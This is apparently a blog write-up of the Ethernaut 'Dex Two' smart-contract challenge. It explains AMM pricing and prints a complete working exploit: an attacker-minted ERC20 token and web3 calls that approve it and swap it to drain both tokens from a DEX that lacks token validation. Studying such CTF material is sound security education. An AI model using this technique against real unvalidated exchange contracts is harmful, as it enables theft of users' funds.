---
title: 'Ethernaut - Dex Two'
date: 2025-05-18
description: 'Solving the Ethernaut DEX Two challenge.'
tags: ['web3', 'solidity', 'ctf']
image: '/images/blog/2025/ethernaut_dex_two.png'
---

In this article, we'll explore the "Dex Two" challenge from Ethernaut, examining a critical vulnerability in a decentralized exchange (DEX) implementation. We'll investigate how token price manipulation can be exploited to drain assets from a contract, and understand the importance of proper validation in smart contract code.

## The Challenge

The "Dex Two" challenge presents a modified version of the original Dex contract with a subtle but devastating change. The challenge description states:

> This level will ask you to break Dex2.
>
> You need to drain all balances of token1 and token2 from the Dex contract to succeed in this level.
> You will still start with 10 tokens of token1 and 10 of token2.
> The DEX contract starts with 100 tokens of token1 and 100 of token2.

Our objective is to drain all of token1 and token2 from the Dex contract, exploiting a vulnerability in its implementation.

## Understanding the Relevant Concepts

Before diving into the vulnerability, let's understand the key concepts behind decentralized exchanges and how this particular implementation works.

### Decentralized Exchanges (DEXs)

A decentralized exchange is a platform that enables users to trade cryptocurrencies without intermediaries. Instead of relying on a central authority to match buy and sell orders, DEXs use smart contracts to facilitate trades.

Key features of DEXs include:

1. **Non-custodial**: Users maintain control of their funds throughout the trading process
2. **Permissionless**: Anyone can participate without approval from a central authority
3. **Transparent**: All trades are visible on the blockchain
4. **Automated**: Trades are executed by smart contracts according to predefined rules

### Automated Market Makers (AMMs)

Many modern DEXs use an Automated Market Maker model, where prices are determined by a mathematical formula based on the relative token balances in liquidity pools. The most common formula is the constant product formula (x * y = k), where:

- x is the balance of token A in the pool
- y is the balance of token B in the pool
- k is a constant that should remain unchanged after trades

When users trade one token for another, they add some amount of the first token to the pool and receive some amount of the second token from the pool. The price is automatically adjusted based on the resulting imbalance in the pool.

### Price Calculation in Dex Two

The Dex Two contract uses a simplified price calculation formula:

```solidity
function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

This formula determines the price based on the relative balances of the two tokens in the contract:

```
swap_amount = (input_amount * balance_output_token) / balance_input_token
```

For example, if the contract holds 100 of token1 and 100 of token2, and you want to swap 10 of token1 for token2, you would receive:
```
(10 * 100) / 100 = 10 token2
```

This formula ensures a 1:1 exchange rate when balances are equal, but adjusts the price as balances change due to trading.

### ERC20 Token Approval Mechanism

A critical aspect of ERC20 token interactions is the approval mechanism. Before a smart contract can move tokens on your behalf, you must explicitly authorize it by calling the `approve` function. This two-step process (approve, then transferFrom) is a security feature of the ERC20 standard that prevents unauthorized spending of tokens.

The approval function typically looks like:

```solidity
function approve(address spender, uint256 amount) external returns (bool);
```

Where:
- `spender` is the address being authorized to spend tokens (in our case, the DexTwo contract)
- `amount` is how many tokens they're allowed to spend

This approval mechanism will be essential for our exploit later, as the DexTwo contract needs permission to transfer our custom token.

## The Vulnerable Contract

Let's examine the `DexTwo` contract, focusing on the `swap` function where the vulnerability resides:

```solidity
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

The key difference from the original Dex contract is that the following line has been removed:

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

This requirement was crucial as it ensured that only token1 and token2 could be swapped. Without this check, the contract now allows swapping between any ERC20 tokens, including custom tokens that we control.

The vulnerability can be summarized as follows:

1. The contract allows swapping between any ERC20 tokens
2. The price calculation is based solely on the relative balances of tokens
3. We can create and control the supply of our own token
4. The contract doesn't validate the token's legitimacy or value

## The Complete Exploit

Now that we understand the vulnerability, let's walk through the complete exploit:

### Step 1: Create Our Malicious Token

First, we create our own ERC20 token that we can mint in any quantity:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
        _mint(msg.sender, initialSupply);
    }
}
```

We'll deploy this contract and mint 400 EVL tokens to ourselves. This specific amount is chosen because we'll need 100 tokens for the first swap and 200 for the second swap, with some buffer.

### Step 2: Setup and Prepare for the Attack

After deploying our EvilToken, we need to prepare for the attack:

```javascript
// Get token1 and token2 addresses
const t1 = await contract.token1();
const t2 = await contract.token2();

// Verify initial balances in the DexTwo contract
await contract.balanceOf(t1, instance).then(v => v.toString()); // "100"
await contract.balanceOf(t2, instance).then(v => v.toString()); // "100"

// Transfer 100 EVL to the DexTwo contract to establish an initial balance
await evlContract.methods.transfer(instance, "100").send({from: player});

// Verify our EvilToken was transferred successfully
await contract.balanceOf(evlToken, instance).then(v => v.toString()); // "100"
await contract.balanceOf(evlToken, player).then(v => v.toString()); // "300"
```

This establishes an initial balance of 100 EVL in the contract, matching the balances of token1 and token2. This equal balance is crucial for our first swap to work at a 1:1 ratio.

### Step 3: Approve the DexTwo Contract to Spend Our Tokens

Before we can execute the swap function, we need to grant the DexTwo contract permission to transfer our EvilToken. This is where the ERC20 approval mechanism comes in:

```javascript
// Define the minimal ABI for the approve function
const erc20Abi = [
  {
    "constant": false,
    "inputs": [
      {"name": "_spender", "type": "address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "approve",
    "outputs": [{"name": "", "type": "bool"}],
    "type": "function"
  }
];

// Create a contract instance for our EvilToken
const evlTokenContract = new web3.eth.Contract(erc20Abi, evlToken);

// Approve the DexTwo contract to spend 300 EVL tokens
await evlTokenContract.methods.approve(instance, "300").send({from: player});
```

This ABI definition provides the interface needed to call the `approve` function on our EvilToken. We approve exactly 300 tokens (100 for the first swap + 200 for the second) to follow the principle of least privilege.

Without this approval step, our exploit would fail because the DexTwo contract uses `transferFrom` in its swap function, which requires prior approval.

### Step 4: Execute the Exploit

Now we can perform the swaps to drain token1 and token2:

```javascript
// Drain token1 by swapping 100 EVL for 100 token1
await contract.swap(evlToken, t1, 100);

// Drain token2 by swapping 200 EVL for 100 token2
await contract.swap(evlToken, t2, 200);

// Verify that we've drained all tokens
await contract.balanceOf(t1, instance).then(v => v.toString()); // "0"
await contract.balanceOf(t2, instance).then(v => v.toString()); // "0"
```

## How It Works Under the Hood

Let's break down exactly how this exploit works by examining the mechanics of each swap operation:

### First Swap: Draining token1

When we call `swap(evlToken, t1, 100)`, we're asking to exchange 100 EVL for token1. The contract calculates the amount of token1 we should receive:

```
swapAmount = (amount * balance_to) / balance_from
           = (100 * 100) / 100
           = 100
```

Since both tokens have a balance of 100 in the contract, we get a 1:1 exchange rate. The contract sends us all 100 token1 in exchange for our 100 EVL.

### Second Swap: Draining token2

For the second swap, `swap(evlToken, t2, 200)`, we need to exchange 200 EVL for token2. At this point, the contract has 200 EVL (the initial 100 plus the 100 we just sent), so the calculation is:

```
swapAmount = (amount * balance_to) / balance_from
           = (200 * 100) / 200
           = 100
```

By sending 200 EVL, we drain the remaining 100 token2. The ratio of 2:1 is necessary because we've already doubled the EVL balance in the contract from our first swap.

## What Happens in the Key Functions

Let's examine the key functions in detail to understand the vulnerability fully:

### The `getSwapAmount` Function

```solidity
function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

This function calculates how much of the "to" token the user should receive based on:
1. The amount of "from" token they're providing
2. The contract's balance of both tokens

The key insight is that this function doesn't care about the intrinsic value of either token – it only considers their relative balances in the contract. This makes it vulnerable to manipulation using tokens with arbitrary value.

### The `swap` Function

```solidity
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

This function performs the exchange by:
1. Checking if the user has enough of the "from" token
2. Calculating how much of the "to" token they should receive
3. Transferring the "from" token from the user to the contract
4. Approving the contract to spend the calculated amount of the "to" token
5. Transferring the "to" token from the contract to the user

The critical vulnerability is that there's no validation of which tokens can be swapped. By removing the check for valid tokens, the contract allows swapping between any ERC20 tokens, including our malicious EvilToken.

## Conclusion

The "Dex Two" challenge from Ethernaut illustrates a fundamental security principle in smart contract development: always validate inputs and ensure that critical functionality is properly protected. By removing a single line of code that validated which tokens could be swapped, the contract became vulnerable to a trivial attack that allowed draining all its assets.
